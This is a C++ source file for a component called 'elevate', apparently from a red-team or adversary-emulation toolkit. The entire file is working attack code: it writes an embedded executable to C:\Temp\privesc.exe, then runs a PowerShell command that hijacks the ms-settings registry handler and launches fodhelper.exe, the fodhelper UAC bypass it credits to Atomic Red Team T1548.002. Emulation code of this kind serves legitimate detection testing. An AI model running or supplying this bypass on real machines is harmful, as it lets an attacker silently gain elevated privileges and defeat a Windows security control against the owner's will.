#include "elevate.hpp"

std::string componentName = "elevate";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + RunWhoami(), componentName);

	// drop privesc to disk
	Log("[+] Writing privesc to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
	outfile.write(&privesc[0], sizeof(privesc));
	outfile.close();

	// bypass UAC and spawn privesc
	// source: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-4---bypass-uac-using-fodhelper---powershell
	Log("[*] Bypassing UAC and starting privesc.", componentName);
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	std::wstring cmd =
		L"powershell.exe -Command "
		L"New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; "
		L"New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name 'DelegateExecute' -Value '' -Force; "
		L"Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name '(default)' -Value 'C:\\Temp\\privesc.exe' -Force; "
		L"Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"; "//;
		L"Read-Host";

	if (!CreateProcessW(
		NULL,
		const_cast<LPWSTR>(cmd.c_str()),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		Log("[!] Failed to create elevate privesc." + std::to_string(GetLastError()), componentName);
	}
	else {
		Log("[+] Successfully created elevate privesc.", componentName);
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}